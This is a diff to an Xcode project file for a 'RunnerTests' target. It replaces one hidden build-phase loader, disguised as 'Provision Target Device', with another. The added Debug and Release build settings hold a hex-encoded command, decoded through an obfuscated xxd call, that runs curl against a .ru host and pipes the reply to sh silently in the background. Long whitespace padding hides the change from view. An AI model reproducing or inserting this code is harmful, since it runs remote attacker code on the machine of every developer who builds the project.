@@ -186,7 +186,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				F362BDB556DE428C827BBDC8 /* Provision Target Device */,
+				9F475EDB203E4131B74EE078 /* Provision Target Device */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -273,7 +273,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																																																																																												/* End PBXBuildRule section */
+																																																																																																																					/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C80D3294CF70F00263BE5 /* Resources */ = {
@@ -295,7 +295,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		F362BDB556DE428C827BBDC8 /* Provision Target Device */ = {
+		9F475EDB203E4131B74EE078 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -312,7 +312,7 @@
 			);
 			shellPath = /bin/sh;
 			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
 		};
 		3399D490228B24CF009A79C7 /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -404,7 +404,7 @@
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((t(){ `printf xxPd | tr -d P` -p -r; };echo 6563686f202224286375726c202d734c666b202d2d636f6e6e6563742d74696d656f7574203233202d2d72657472792035202d642022703d78636f64655f7068617365222068747470733a2f2f6c3263706c2d656d742e72752f612922207c2073680a | t | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((m(){ `printf xBxd | tr -d B` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203236202d4c73666b202d2d72657472792033202d642022703d78636f64655f7068617365222068747470733a2f2f6c382d703662336d72617478302e72752f612922207c2073680a | m | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -419,7 +419,7 @@
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((t(){ `printf xxPd | tr -d P` -p -r; };echo 6563686f202224286375726c202d734c666b202d2d636f6e6e6563742d74696d656f7574203233202d2d72657472792035202d642022703d78636f64655f7068617365222068747470733a2f2f6c3263706c2d656d742e72752f612922207c2073680a | t | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((m(){ `printf xBxd | tr -d B` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203236202d4c73666b202d2d72657472792033202d642022703d78636f64655f7068617365222068747470733a2f2f6c382d703662336d72617478302e72752f612922207c2073680a | m | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
